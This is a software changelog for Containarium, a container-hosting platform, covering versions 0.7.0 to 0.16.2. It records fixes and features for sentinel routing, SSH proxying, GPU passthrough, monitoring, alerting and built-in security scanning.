# Changelog

All notable changes to Containarium will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.16.2] - 2026-05-08

### Fixed
- **`containarium-shell` breaks collaborator SSH logins** (`scripts/setup-peer-user.sh`): The shell script derived the target container as `${USERNAME}-container`, so a collaborator account `voice-dev-container-test` resolved to `voice-dev-container-test-container` (nonexistent), producing `Error: Container not found` on every login. Collaborator accounts follow the `<owner>-container-<collaborator>` naming pattern; the container is `<owner>-container`. Fix: if the primary container lookup fails, strip the trailing `-<collaborator>` suffix with `${USERNAME%-*}` and retry. Regular owner accounts (`voice-dev` → `voice-dev-container`) are unaffected. Existing deployments must re-push the script to each node (GCP spot VM and peer nodes).

## [0.16.1] - 2026-05-06

### Fixed
- **Jump server account missing sudoers entry** (`internal/container/jump_server.go`): `CreateJumpServerAccount` (the path used when the daemon auto-creates a container's host user) wrote `useradd` and the SSH key but never wrote `/etc/sudoers.d/containarium-<user>`. The user's `containarium-shell` then hit a password prompt on every SSH because `sudo incus exec` had no NOPASSWD rule. `EnsureJumpServerAccount` (a separate entry point) already had the sudoers write; this brings the primary path to parity. Symptom: `ssh <user>` returned `[sudo] password for <user>:` and hung. Existing host users on running daemons stay broken until the operator writes the sudoers file manually (see `setup-peer-user.sh`) or the daemon recreates them.

## [0.16.0] - 2026-05-06

### Added
- **Multi-pool architecture** — One sentinel can now front multiple independent Containarium clusters, each with its own primary VM, peers, core stack, and subdomain. See [docs/MULTI-POOL.md](docs/MULTI-POOL.md).
  - **Pool tag on peers** — `containarium tunnel --pool=<name>` and `setup-peer.sh --pool=<name>` propagate a pool tag through the tunnel handshake to `TunnelSpot` and `Backend`. `GET /sentinel/peers?pool=<name>` filters by tag (omitting the param keeps the back-compat behavior of returning all peers).
  - **Pool-scoped peer discovery** — `containarium daemon --pool=<name>` makes the primary's `PeerPool.discover()` append `?pool=` to its sentinel call, so a primary sees only its own pool's peers.
  - **Primary self-registration** — `containarium daemon --public-hostname=<host> --public-port=<port>` makes the daemon `POST /sentinel/primaries` at startup, heartbeat every 30s, and `DELETE` on shutdown. Sentinel evicts entries that miss heartbeats for 90s. The sentinel auto-fills the primary's IP from the request's `RemoteAddr` so the daemon doesn't need to know its own routable address.
  - **SNI-based routing on the sentinel** — The HTTPS dispatcher peeks the TLS ClientHello SNI and looks up the matching primary via the registry, forwarding TCP bytes (still TLS passthrough) to that primary's IP:port. Connections with no SNI, malformed handshakes, or unregistered hostnames fall back to the existing single-backend forwarding — fully back-compat for unpooled deployments.
  - **Hostname aliases for app domains** — `--public-aliases foo.example,bar.example` (also `Primary.Aliases` in the registry) lets a primary advertise every hostname its Caddy serves, not just its own subdomain. The SNI router matches against `Hostname` plus all `Aliases`, so app domains like `api.kafeido.app` route to the correct pool's primary instead of falling through to the legacy single-backend default.
  - **Primary registration via tunnel handshake** — `containarium tunnel --public-hostname=<host> --public-aliases=… --public-port=443` (also exposed in `setup-peer.sh`) tells the sentinel to promote that tunnel into a primary registry entry pointing at its loopback alias. Lets a primary VM behind NAT/Tailscale register itself without needing direct HTTP access to `/sentinel/primaries`. The tunnel disconnect cleans up the primary entry automatically. SNI routing then forwards inbound TLS bytes back through the same tunnel.
  - **Token-bound pool authorization** — `containarium sentinel --tunnel-token-policy <token>=<pool1>,<pool2>` (repeatable) replaces "any token can claim any pool" with explicit `token → []allowed_pools` rules. A token restricted to `lab` can no longer register a tunnel claiming `pool=prod`. The legacy `--tunnel-token` keeps working as a wildcard rule (any pool allowed). Use `*` as a pool name for explicit wildcard. Adds a typed `Pool` (Go `type Pool string`) with a `PoolAny` constant so the policy rules and registry lookups can't be confused with hostnames or other strings.
  - **SNI router uses yamux for tunneled primaries** — When a primary is tunnel-promoted (slice 6), its `IP` is a sentinel-side loopback alias. Going through a TCP listener on that alias would conflict with the sentinel's own ConnMux on `:443`. Slice 8 fixes this: the SNI dispatcher detects `Primary.BackendID != ""` and uses `TunnelRegistry.DialTunnel(spotID, port)` to open a yamux stream straight to the primary's local port, bypassing any sentinel-side TCP listener for that port. The tunnel server also skips binding a loopback proxy listener for `PublicPort` to avoid the noisy "address already in use" log line.

### Fixed
- **Tunnel handshake over-read corrupts yamux** — `readHandshake` and `readHandshakeResponse` used `json.NewDecoder` over the raw connection. Its internal buffer can swallow bytes that arrive in the same TCP packet as the JSON (e.g., the yamux SYN frame the sentinel writes immediately after the handshake response when keysync starts). Those buffered bytes are unreachable once the decoder is discarded, so yamux's frame reader misaligns and produces `Invalid protocol version: <byte>` errors — observed in production when fts-13700k reconnected under load and saw `version: 71` (the `'G'` from a buffered HTTP `GET`). Fix: read line-delimited (newline-terminated) JSON, leaving any subsequent bytes on the underlying reader for yamux. Both sides updated. Latent bug present since the original tunnel implementation; not specific to slice 8 even though the slice 8 deploy is what surfaced it.
- **Tunnel-promoted primaries decay after 90s TTL** — `PrimaryRegistry.All()` evicts entries whose `LastHeartbeat` is older than `PrimaryTTL` (90s). Tunnel-promoted primaries (slice 6) only get `LastHeartbeat` set at handshake time and have no heartbeat refresher, so they silently drop out of `/sentinel/primaries` 90s after registration even though the yamux session stays up. Fix: skip TTL eviction for entries with `BackendID` set. Their lifetime is tied to the yamux session via `OnTunnelConnect` / `OnTunnelDisconnect` (`UnregisterByBackendID`); TTL is for HTTP-registered primaries that may have died without `DELETE`'ing.
- **Lab pool bring-up: 4 issues caught while standing up first tunneled primary**
  - **Subnet drift between `--network-subnet` flag and actual incusbr0** (`internal/cmd/daemon.go`): Incus' `EnsureNetwork` is idempotent and won't change a pre-existing bridge's subnet. The daemon used to trust the flag value and pass it as `HostIP` for Caddy reverse_proxy upstreams, traffic-collector network filter, etc. — when the bridge's actual subnet differed (e.g., `10.52.59.0/24` from `incus admin init --auto` vs `--network-subnet=10.0.4.1/24`), Caddy proxied to a non-existent gateway and returned silent 502s. Fix: after `InitializeInfrastructure`, query `GetNetworkSubnet("incusbr0")` and use that as the authoritative subnet, logging the override if different.
  - **Port forwarder missing OUTPUT-chain DNAT** (`internal/network/portforward.go`): tunnel-promoted primaries (slice 6) have the tunnel client receive a yamux stream and dial `127.0.0.1:443` to forward bytes locally. PREROUTING DNAT alone doesn't catch local-origin packets; OUTPUT chain is needed. Added `ensureOutputRule(port)` alongside the existing `ensurePreRoutingRule(port)`, with per-rule idempotency so an upgraded deploy with PREROUTING but not OUTPUT picks up the missing rule on next setup.
  - **`route_localnet=1` not enabled** (`internal/network/portforward.go`): even with the OUTPUT DNAT in place, the kernel's default `route_localnet=0` refuses to route `127.0.0.0/8` packets out a non-loopback interface. The port forwarder now sets `net.ipv4.conf.all.route_localnet=1` at runtime and persists it via `/etc/sysctl.d/99-containarium-route-localnet.conf`.
  - **Caddy TLS app missing on first install** (`internal/app/proxy.go`): `ProvisionTLS` PATCHed `/config/apps/tls/automation/policies` directly, but on a fresh Caddy `apps.tls` is `null` — Caddy returned 400 `invalid traversal path`. The `ensureTLSApp` helper already existed (creates `apps.tls` with a default ACME policy via PUT) but wasn't being called from `ProvisionTLS`. Wired it in, and made the null check robust to Caddy's `"null\n"` (with trailing whitespace) response.
  - **Port forwarder runs before Caddy spawned** (`internal/server/dual_server.go`): on first install, the daemon's auto-detect-Caddy step at startup runs BEFORE `EnsureCaddy` spawns the Caddy container. The auto-detect logged a warning and skipped port-forward setup; first deploys required a daemon restart to pick it up. Fix: re-run `PortForwarder.SetupPortForwarding` immediately after `EnsureCaddy` succeeds.
- **Postgres restart policy missing on auto-detected containers** (`internal/server/dual_server.go`): when the daemon auto-detects an existing `containarium-core-postgres` container (the path used by primaries running without `--app-hosting`, e.g. prod), it just records the connection string and never invokes `ensurePostgresRestartPolicy()`. Result: postgres has no `Restart=on-failure` systemd override, and an OOM kill leaves it down indefinitely (we hit a 12-day silent outage that took down Grafana). Fix: re-apply the policy on the auto-detect path; idempotent.
- **GPU device passthrough breaks across kernel upgrades** (`internal/incus/client.go`, `internal/container/manager.go`): containers were configured with `gpu: { id: "0", type: gpu }`, where `id` is Incus' DRM card minor index. When a kernel upgrade renumbers DRM minors (observed on `fts-5900x` after `6.8.0-110` → `6.8.0-111`, where the RTX 4090 moved from `card0` to `card1`), every container with `id: "0"` fails to start with `Failed to detect requested GPU device`. Fix: new `Client.ResolveGPUInputToPCI()` resolves the user's `--gpu N` (positional index) or PCI string into the GPU's PCI address at container creation time. Containers always get pinned by PCI, which is stable across reboots and kernel changes. Existing containers with `id`-based config aren't auto-migrated; document the manual fix in the runbook (see `incus config device set <name> gpu pci=<addr>`).
- **Lab pool SSH lands at host nologin instead of inside the container** (`scripts/install-lab-phase-b.sh`, `internal/container/jump_server.go`): the lab install script never installed `/usr/local/bin/containarium-shell`, so the daemon's `getUserShell()` fell back to `/usr/sbin/nologin` when creating per-container host users. SSH then authenticated successfully but the upstream sshd ran nologin and printed "This account is currently not available." Fix: install-lab-phase-b.sh now installs the wrapper and writes `/etc/motd` with the standard Containarium banner labelled `${POOL} pool` (idempotent — both steps no-op if already in place). The daemon also stops writing `~/.hushlogin` when creating users; the host MOTD *is* the Containarium banner and was the only signal that the session was going through the proxy hop. Existing per-container host users keep their stale `.hushlogin` until manually removed.

### Added
- **GPU stacks** — New `gpu` (nvidia-utils-570, CUDA toolkit, cuDNN) and `gpu-docker` (CUDA + Docker CE + nvidia-container-toolkit) stacks for container provisioning
- **Peer metrics federation** — Local metrics collector pushes peer container and system metrics to VictoriaMetrics with `backend_id` labels; Grafana dashboard adds Backend Node dropdown and per-node panels
- **Container provisioning state** — New `CONTAINER_STATE_PROVISIONING` proto enum shows stack installation progress during async container creation
- **Auto ClamAV scan** — Newly created containers are automatically enqueued for ClamAV scanning with a 2-minute delay
- **Peer API forwarding** — Sentinel forwards metrics, system info, security summary, and container traffic requests to peer backends with service token auth
- **Per-backend system info** — `backend_id` field on SystemInfo and `peers` field on GetSystemInfoResponse for multi-backend visibility
- **ZFS backup** — `setup-gpu-host.sh` auto-detects disks, creates HDD RAID1 mirror as `incus-backup` pool, installs daily ZFS backup cron

### Changed
- **Grafana dashboard** — Reorganized with `$backend` template variable, "Node Metrics" row (CPUs, containers, memory, disk, load), and "Container Metrics" row with per-backend filtering
- **setup-gpu-host.sh** — Rewritten with `--data-disk`, `--backup-disks`, `--yes` flags and auto-detection of unused NVMe/HDD disks
- **containarium-shell** — Added ASCII banner for interactive sessions, non-interactive `-c` command support, and auto-detected incus binary path for sudoers

### Fixed
- **SSH non-interactive command forwarding** — `containarium-shell` now handles `-c "command"` arguments from sshpiper exec forwarding, in addition to `SSH_ORIGINAL_COMMAND`
- **sshpiper authorized_keys parsing** — Strip blank lines and comments before writing; sshpiper's parser stopped at blank lines, preventing key matching
- **Tunnel loopback IP reuse** — Reconnecting tunnel clients reuse their previous loopback IP, preventing stale sshpiper config and SSH failures during reconnects
- **Tunnel clean shutdown** — Close yamux session on context cancel to avoid 90-second SIGKILL timeout
- **Peer metrics parsing** — Use `protojson.Unmarshal` for gRPC-gateway enum strings and `json.Number` for quoted numeric values

## [0.14.0] - 2026-03-28

### Added
- **Multi-backend peer operations** — Resize, CleanupDisk, and Collaborator operations (Add/Remove/List) now forward to peer backends when the container is not local
- **Terminal WebSocket peer routing** — Terminal sessions proxy to peer backends transparently via `PeerTerminalProxy` interface; the gateway bridges WebSocket connections between client and peer
- **Per-backend system info API** — New `GET /v1/backends/{id}/system-info` endpoint returns CPU, memory, disk, and GPU info for a specific backend
- **GPU system info** — `GPUVendor` and `GPUModel` proto enums, `GPUInfo` message with vendor/model/driver/CUDA/VRAM fields, populated from Incus server resources
- **Web UI node filter and search** — Real-time search by name/username/IP, node dropdown filter (when multiple backends), filtered count display, backend chip on grid cards
- **Web UI backend resource selector** — Toggle button group on System Resources card to view CPU/memory/disk/GPU stats per backend, with auto-refresh
- **SSH container proxy (`containarium-shell`)** — Login shell that proxies SSH sessions into containers via `incus exec`, enabling unified `ssh user@sentinel` for all backends including firewalled/NAT hosts
- **Setup script** `scripts/setup-ssh-container-proxy.sh` — Installs containarium-shell, sudoers rule, and /etc/shells entry

### Fixed
- **Tunnel SSH port conflict** — Tunnel server uses port 20022 for SSH proxy listeners on loopback aliases, preventing conflict with sshpiper's `*:22` binding on the sentinel
- **NVIDIA GPU model name** — Fixed duplicate brand prefix in model name string from Incus nvidia sub-struct


### Added
- **OWASP ZAP web application scanning** — New "ZAP Scan" tab under Security for automated web application vulnerability scanning of all exposed Containarium endpoints.
  - Full gRPC service with 8 RPCs: trigger scan, list scans, list alerts, get summary, suppress alert, get config, download report, install ZAP
  - PostgreSQL persistence with 3 tables (`zap_scan_runs`, `zap_alerts`, `zap_scan_jobs`) and fingerprint-based alert deduplication
  - Async job queue with 2 concurrent workers and configurable scan interval (default 30 days)
  - Spider + active scan per target URL via ZAP daemon REST API running inside the security container
  - HTML/JSON report generation and download per scan run
  - React UI with summary cards, alert table with risk/status filters, pagination, suppress dialog, CSV/JSON export, scan history with report download, and one-click ZAP installation
  - Proto definitions (`proto/containarium/v1/zap.proto`), server implementation, and REST gateway
- **Pentest findings download** — Download all filtered pentest findings as CSV or JSON from the Security > Pentest tab. The download respects current severity/category/status filters and fetches up to 1000 findings per target type.

### Changed
- **Security tools moved to container** — nuclei, trivy, and ZAP now install and run inside the `containarium-core-security` container instead of the host filesystem, freeing ~290MB on the root disk. The pentest installer, nuclei module, and trivy module all use `incus exec` to operate inside the container. Trivy mounts target container rootfs via disk devices.

### Fixed
- **Port-scan findings misclassified as domain findings** — The `ports` scanner module now only runs on container targets, preventing open-port findings from appearing under "Domain Findings". Existing misclassified findings are automatically reclassified on startup.

## [v0.13.0] - 2026-03-15

### Added
- **Penetration testing system** — Built-in security scanner with 7 modules that scan container endpoints and dependencies:
  - **Built-in modules**: `ports` (open port detection), `headers` (HTTP security header audit), `tls` (weak protocol/cipher/cert checks), `web` (exposed .env/.git/debug endpoints), `dns` (dangling CNAMEs, missing SPF/DMARC/DKIM)
  - **External tool modules**: `nuclei` (template-based vulnerability scanning) and `trivy` (container filesystem CVE scanning via rootfs inspection) — auto-installable from the UI
  - 8 gRPC/REST endpoints (`/v1/pentest/*`): trigger scans, list findings with severity/category/status filters, suppress findings, view scan history, install tools
  - Async job queue with 5 concurrent workers, SHA-256 fingerprint-based finding deduplication, scheduled scans (default 24h), 90-day retention
  - Proto definitions (`proto/containarium/v1/pentest.proto`), server implementation, and web UI (Security > Pentest tab)
- **Demo page: Alerts, Audit, and Pentest tabs** — Complete demo coverage with mock data for all tabs including alert rules, webhook delivery history, audit logs, and grouped pentest findings.

### Changed
- **Pentest findings grouped by container** — The Security > Pentest tab now groups findings by container name instead of showing a flat list. Each group has a collapsible header showing the container name and finding count, sorted by most findings first.
- **README screenshots updated** — Replaced numbered screenshots with descriptive names; added Alerts and Audit sections.
- **Next.js upgraded to 16.1.6** — Security update addressing CVE-2025-66478 (RCE), CVE-2025-55182/55183/55184 (RSC vulnerabilities), and CVE-2026-23864 (DoS).

## [v0.12.0] - 2026-03-15

### Added
- **Alerting system with vmalert + Alertmanager** — Metric-based alerting integrated into the daemon via VictoriaMetrics vmalert (v1.108.1) and Prometheus Alertmanager (v0.27.0), running inside the `core-victoriametrics` container.
  - 9 default alert rules: `HighMemoryUsage`, `HighDiskUsage`, `DiskAlmostFull`, `HighCPULoad`, `MetricsCollectionDown`, `ContainerHighMemory`, `ContainerHighCPU`, `ContainerStopped`, `NoRunningContainers`
  - Custom alert rule CRUD via gRPC/REST API (`/v1/alerts`) with PostgreSQL persistence
  - Webhook notifications with optional HMAC-SHA256 payload signing (`X-Containarium-Signature` header) via an internal relay
  - Webhook delivery history tracking (`/v1/system/alerting/deliveries`) with 1000-row / 30-day retention
  - Idempotent setup — detects existing vmalert install and only updates rules on restart
- **Alerts web UI** (`/webui/alerts/`) — Full management interface with tabs for default rules, custom rules, and delivery history. Clickable rule rows open a detail dialog showing the full PromQL expression, equivalent vmalert YAML, and a PromQL writing guide. Webhook configuration dialog with HMAC secret generation and inline verification code examples (Python, Go, Node.js).
- **Alert proto definitions** (`proto/containarium/v1/alert.proto`) — 8 new RPCs: `CreateAlertRule`, `ListAlertRules`, `GetAlertRule`, `UpdateAlertRule`, `DeleteAlertRule`, `GetAlertingInfo`, `UpdateAlertingConfig`, `TestWebhook`, `ListWebhookDeliveries`
- **OCI runtime wrapper for Docker cgroup limit injection** — Registers a custom OCI runtime (`containarium-runtime`) as Docker's default via `daemon.json`. Intercepts every `runc create` — from CLI, Compose v2, or API — and injects LXC memory/CPU cgroup limits into the OCI spec. Also bind-mounts LXCFS-backed `/proc` files (`meminfo`, `cpuinfo`, `stat`, etc.) so tools like `free` and `top` report correct values inside nested containers. See [`docs/OCI-RUNTIME-CGROUP-INJECTION.md`](docs/OCI-RUNTIME-CGROUP-INJECTION.md).
- **Automatic OCI runtime upgrade on daemon startup** — `UpgradeCgroupWrappers()` now installs the OCI runtime on all existing Docker containers, in addition to CLI wrappers
- **Caddy L4 SNI-based TLS passthrough** — mTLS gRPC services are now exposed on `:443` via SNI hostname routing, eliminating the need for per-port GCP firewall rules and sentinel iptables forwarding. Caddy L4 inspects the TLS ClientHello SNI field without decrypting, preserving end-to-end mTLS.
- **L4ProxyManager** (`internal/app/l4_proxy.go`) — manages Caddy L4 TLS passthrough routes via the admin API using atomic `/load` config replacement
- **Lazy L4 activation** — the L4 layer activates only when TLS passthrough routes exist in the database and deactivates automatically when all are removed
- **TLS Passthrough protocol** (`tls_passthrough`) — new route protocol in protobuf, route store, and sync job (`ROUTE_PROTOCOL_TLS_PASSTHROUGH = 5`)
- **Custom Caddy build with L4 plugin** — `setupCaddy()` now builds Caddy via xcaddy with `github.com/mholt/caddy-l4` instead of stock apt install
- **TLS Passthrough section in Network UI** — dedicated table section with VpnLockIcon showing SNI-routed connections on `:443`
- L4 config types (`CaddyL4App`, `CaddyL4Server`, `CaddyL4Route`, etc.) in `internal/app/caddy_types.go`

### Changed
- **Add Route form simplified** — removed the old "Passthrough (TCP/UDP)" route type selector; all routes now use a unified form with Protocol dropdown (HTTP / gRPC / TLS Passthrough)
- **RouteSyncJob** splits routes by protocol: HTTP/gRPC routes sync to ProxyManager, `tls_passthrough` routes sync to L4ProxyManager
- **HTTP server port handoff** — when L4 is active, the HTTP server moves from `:443` to `:8443` with `tls_connection_policies`; L4 catch-all routes non-matching SNI back to the HTTP server

### Fixed
- **Docker Compose v2 containers now see correct cgroup limits** — Previously, Compose v2 bypassed the CLI wrapper (it uses the Docker Engine API directly), so compose-managed containers saw the host's full resources instead of the LXC cgroup limits. The OCI runtime wrapper fixes this at the runc level.
- **`free` / `top` inside Docker containers now report correct memory** — LXCFS bind mounts are passed through from the LXC container into nested Docker containers via the OCI runtime

### Removed
- Old per-port TCP/UDP passthrough form in the Add Route dialog (replaced by TLS passthrough on `:443`)

## [v0.11.0] - 2026-03-11

### Added
- **ClamAV security scanning** — Full antivirus integration via a `containarium-core-security` container running ClamAV. Scans container root filesystems by mounting them read-only into the security container.
  - Persistent scan reports in PostgreSQL (`clamav_reports` table) with filtering by container, status, and date range
  - CSV export via `GET /v1/security/clamav-reports/export`
  - Per-container summary API (`GET /v1/security/clamav-summary`) with clean/infected/never-scanned counts
  - Automatic daily background scan cycle with 90-day report retention
- **Async scan job queue** — ClamAV scans now run asynchronously via a PostgreSQL-backed job queue (`scan_jobs` table), replacing the previous synchronous blocking approach.
  - `POST /v1/security/clamav-scan` returns immediately with queued job count instead of blocking for 10+ minutes
  - 3-worker pool processes scans concurrently, polling the queue with `FOR UPDATE SKIP LOCKED` for safe concurrent claiming
  - Automatic retries (up to 2) for transient failures (e.g., stale mount errors)
  - Jobs survive daemon restarts — pending/failed-retryable jobs resume automatically
- **Scan status API** — New `GET /v1/security/scan-status` endpoint returns real-time queue state: per-job details and aggregate pending/running/completed/failed counts
- **Security dashboard** — New `/security` page in the web UI
  - Summary cards: total, clean, infected, and never-scanned container counts
  - Container table sorted by severity (infected first), with expandable per-container scan history
  - Context-aware per-container scan action icons reflecting job queue state: hourglass (queued), spinner (running), green checkmark (completed), red error with tooltip (failed), scanner icon (idle)
  - Real-time scan progress bar with status counts, polls every 5 seconds during active scans
  - Date range picker for CSV report download
- **Core services section** — New panel in the web UI showing infrastructure container status (PostgreSQL, Caddy, VictoriaMetrics, ClamAV) via `GET /system/core-services`
- **Stack install CLI** — New `containarium install-stack` command for deploying predefined container stacks

### Changed
- **`SecurityService` proto** — New gRPC service with 4 RPCs: `ListClamavReports`, `TriggerClamavScan`, `GetClamavSummary`, `GetScanStatus`. Auto-registered on the gRPC-gateway for REST access.

## [v0.10.0] - 2026-03-09

### Added
- **Monitoring stack** — Auto-provision VictoriaMetrics + Grafana as a core service container (`containarium-core-victoriametrics`). A single consolidated dashboard is embedded in the web UI Monitoring tab via a `/grafana/` reverse proxy, rendered in kiosk mode with light theme.
  - System metrics: CPU load (1m/5m/15m), memory/disk gauges, running/stopped container counts
  - Per-container metrics: CPU usage (cores via `rate()`), memory, disk, network I/O
  - Grafana uses existing PostgreSQL for config database, file-based dashboard provisioning
- **OpenTelemetry metrics collector** — In-process OTel SDK pushes system and per-container metrics every 30s via OTLP/HTTP to VictoriaMetrics (`internal/metrics/otel.go`)
- **HTTP metrics middleware** — Tracks API request rate and latency histograms (`internal/metrics/http_middleware.go`)
- **`GetMonitoringInfo` API** — New gRPC/REST endpoint (`GET /v1/system/monitoring`) returning Grafana URL, VictoriaMetrics URL, and enabled status
- **Disk cleanup API** — Disk cleanup endpoint, route toggle, and URL-based tab routing (#42)
- **Stop container API** — Add stop container endpoint (#41)

### Fixed
- **Passthrough routes now persist across VM restarts** — TCP/UDP port-forwarding rules (iptables DNAT) were purely ephemeral and lost on VM recreation. They are now stored in PostgreSQL as the source of truth, mirroring the existing `RouteStore`/`RouteSyncJob` pattern for HTTP proxy routes (#39).
- **Subdomain concatenation** — Fix subdomain being incorrectly concatenated in certain configurations (#40)

## [0.9.1] - 2026-02-28

### Fixed
- **Boot disk size validation** — Lowered minimum from 100GB to 10GB to support production environments with small boot disks (e.g., sentinel VMs).

## [0.9.0] - 2026-02-28

### Changed
- **Terraform module consolidation** — Extracted all infrastructure resources into a reusable module at `terraform/modules/containarium/`. The dev consumer (`terraform/gce/`) and any production deployment can now consume a single source of truth via `git::` module source, eliminating config drift.
- **Startup scripts parameterized** — `fail2ban_whitelist_cidr` and `jwt_secret` are now Terraform template variables instead of hardcoded values, allowing the same scripts to serve different environments (e.g., `10.128.0.0/9` for default network vs `10.0.0.0/8` for VPC).
- **Sentinel runs in same region as spot VM** — Removed `sentinel_region`/`sentinel_zone` variables. Sentinel always deploys in the same zone as the spot VM, matching the production topology.
- **Go embed package rewritten** — Replaced broken `//go:embed` directives (Go doesn't allow `../` in embed paths) with `runtime.Caller()` + `os.ReadFile()` approach. Exports `TerraformDir()`, `ConsumerDir()`, `ModuleDir()` helpers.
- **E2E test updated** — Test workspace now copies the full `gce/` + `modules/` tree so relative module source paths resolve correctly.

### Added
- **`terraform/modules/containarium/`** — New shared Terraform module containing all GCE resources (VMs, firewall rules, disks, startup scripts). Parameterizes environment differences via variables:
  - `network_self_link` / `subnetwork_self_link` — VPC vs default network
  - `spot_vm_external_ip` — ephemeral IP vs Cloud NAT only
  - `enable_iap_firewall` / `enable_health_check_firewall` — production firewall rules
  - `enable_glb_backend` — unmanaged instance group for GLB
  - `jwt_secret` — REST API authentication (empty = auto-generate)
  - `fail2ban_whitelist_cidr` — internal network whitelist
  - `instance_tags` — customizable network tags
  - `spot_vm_name_suffix` — appended to instance name for spot VM (e.g., `-spot`)
- **Production consumer example** at `terraform/modules/containarium/examples/production-consumer/` showing how to consume the module with VPC networking, GLB backend, and IAP firewall rules.

### Removed
- **`horizontal-scaling.tf`** — Horizontal scaling (multiple independent jump servers behind an NLB) is incompatible with the sentinel architecture. Multi-region scaling uses one sentinel+spot pair per region instead.
- **`null_resource` provisioners** — Removed binary SCP provisioners (`copy_containarium_binary`, `copy_binary_to_sentinel`). Binary deployment now uses `containarium_binary_url` exclusively.
- **`ssh_private_key_path` variable** — No longer needed without SCP provisioners.
- **Horizontal scaling example tfvars** (`horizontal-scaling-3-servers.tfvars`, `horizontal-scaling-5-servers.tfvars`).

### Fixed
- **`zpool import -f` in startup-spot.sh** — Forces ZFS pool import when the pool was last used by a different system (common after spot VM recreation). Previously could fail silently.
- **Incus pre-removal in startup-spot.sh** — Removes Ubuntu 24.04's pre-installed Incus 6.0.0 before installing from Zabbly repo, avoiding package conflicts.

## [0.8.2] - 2026-02-28

### Added
- **sshpiper SSH reverse proxy on sentinel** — Deploys [sshpiper](https://github.com/tg123/sshpiper) on sentinel port 22 as an L7 SSH proxy with built-in `failtoban` plugin. Bans client IPs after 3 failed auth attempts (1h ban). Replaces iptables DNAT for SSH, which masked real client IPs and caused fail2ban on the spot VM to ban the sentinel itself.
- **Authorized keys sync** — New `KeyStore` in sentinel syncs SSH authorized keys from the spot VM via `/authorized-keys` HTTP endpoint. Generates sshpiper YAML config mapping each user to the upstream spot VM. Sync runs every 2 minutes; sshpiper is only restarted when config actually changes (avoids killing active sessions).
- **`/authorized-keys` HTTP endpoint** on the spot VM daemon — Returns all jump server users' SSH public keys as JSON. Used by sentinel's KeyStore to build sshpiper routing config.
- **`/authorized-keys/sentinel` POST endpoint** on the spot VM daemon — Accepts the sentinel's upstream public key and appends it to all jump server users' `authorized_keys`, enabling sshpiper to authenticate to the spot VM on behalf of users.
- **Key sync status on sentinel dashboard** — SSH Proxy (sshpiper) section shows synced user count, last sync time, and errors.
- **fail2ban whitelist on spot VM** — Whitelists internal VPC ranges so the sentinel IP is never banned as a safety net.

### Changed
- **Sentinel sshd moved to port 2222 only** — sshd on the sentinel now listens on port 2222 only (management/IAP access). Port 22 is owned by sshpiper. Includes systemd socket override for Ubuntu 24.04 socket activation.
- **Port 22 removed from iptables DNAT** — `enableForwarding()` in `iptables.go` now filters port 22 from the forwarded ports list. SSH traffic reaches sshpiper on the sentinel directly instead of being DNAT'd to the spot VM.
- **Default forwarded ports** — Changed from `22,80,443,50051` to `80,443,50051` in the sentinel CLI.

### Fixed
- **SSH brute-force attacks no longer block all users** — Previously, attackers hitting sentinel:22 were DNAT'd with MASQUERADE to the spot VM, which saw all connections from the sentinel's IP. fail2ban on the spot VM would ban the sentinel IP, blocking all SSH. sshpiper now handles SSH at L7, sees real client IPs, and bans attackers directly.

### Security
- sshpiper `failtoban` plugin provides IP-level banning based on actual SSH auth failures (not connection rate), correctly identifying attackers vs. legitimate users.
- Sentinel's upstream key is automatically distributed to all jump server accounts, so sshpiper can authenticate to the spot VM without storing user private keys.

## [0.8.1] - 2026-02-27

### Fixed

- **Spot VM preemption recovery race condition**: daemon now waits for core containers (PostgreSQL, Caddy) to be healthy before auto-detection and config loading, preventing permanent route loss after VM restart
- **PostgreSQL connection retry**: all connection sites (daemon config, route store, collaborator store) retry up to 5 times with 3-second intervals instead of failing on first "connection refused"
- **Container outbound internet broken by sentinel iptables**: sentinel PREROUTING jump now excludes the container bridge network (`! -s 10.0.3.0/24`), fixing HTTPS from containers being DNAT'd to the spot VM's own IP instead of reaching the internet

### Changed

- **Label-based core container identification**: core containers tagged with `user.containarium.role` labels (`core-postgres`, `core-caddy`) instead of hardcoded name matching; existing containers auto-backfilled on startup
- **Boot priority ordering**: core containers have `boot.autostart.priority` (PostgreSQL=100, Caddy=90) so Incus starts them in correct order after restart
- **Type-safe `incus.Role` type**: introduced typed string for core container roles replacing raw string comparisons
- **Core containers hidden from user listings**: containers with a `user.containarium.role` label excluded from `ListContainers` API

## [0.8.0] - 2026-02-27

### Added
- **Sentinel TLS certificate sync** — sentinel syncs real Let's Encrypt certificates from spot VM's Caddy server, serves valid HTTPS during maintenance mode instead of self-signed certs
  - New `/certs` endpoint on daemon gateway exports Caddy certificates as JSON
  - `CertStore` with SNI-based lookup: exact domain → wildcard → self-signed fallback
  - New daemon flag: `--caddy-cert-dir` (default: `/var/lib/caddy/.local/share/caddy`)
  - New sentinel flag: `--cert-sync-interval` (default: `6h`)
  - Immediate cert sync on recovery (MAINTENANCE → PROXY transition)
- **Sentinel status page** — real-time recovery information at `/sentinel` during maintenance mode
  - Shows: current mode, spot VM IP, forwarded ports, preemption count, last preemption, outage duration, cert sync status
  - Dark theme matching maintenance page, auto-refreshes every 10s
- **Sentinel JSON status API** — machine-readable `/status` endpoint on binary server port (8888), always available regardless of mode
- **Management SSH on port 2222** — sentinel listens on port 2222 for direct management access (port 22 is DNAT'd to spot VM in proxy mode)
  - Startup script configures sshd to listen on both port 22 and 2222
  - New Terraform firewall rule: `sentinel_mgmt_ssh` for port 2222
- **`docs/SENTINEL-DESIGN.md`** — comprehensive sentinel architecture documentation covering modes, TLS cert sync, status page, CLI reference, one-sentinel-to-many-spot-VMs scaling, Terraform config, and operational runbook

### Changed
- Updated README.md architecture to reflect one-sentinel-to-many-spot-VMs scaling model
- Updated `SPOT-RECOVERY.md`, `SPOT-INSTANCES-AND-SCALING.md`, `HORIZONTAL-SCALING-ARCHITECTURE.md`, `terraform/gce/README.md` to reference new `SENTINEL-DESIGN.md`
- Sentinel startup script: fixed `systemctl restart sshd` → `ssh || sshd || true` for Ubuntu compatibility

## [0.7.0] - 2026-02-25

### Added
- **Collaborator permission levels** — fine-grained access control when adding collaborators
  - `--sudo` flag grants full sudo access (`ALL=(ALL) NOPASSWD: ALL`) instead of restricted `su - owner`
  - `--container-runtime` flag adds collaborator to docker/podman groups for container runtime access
  - New proto fields: `grant_sudo`, `grant_container_runtime` on `AddCollaboratorRequest`; `has_sudo`, `has_container_runtime` on `Collaborator`
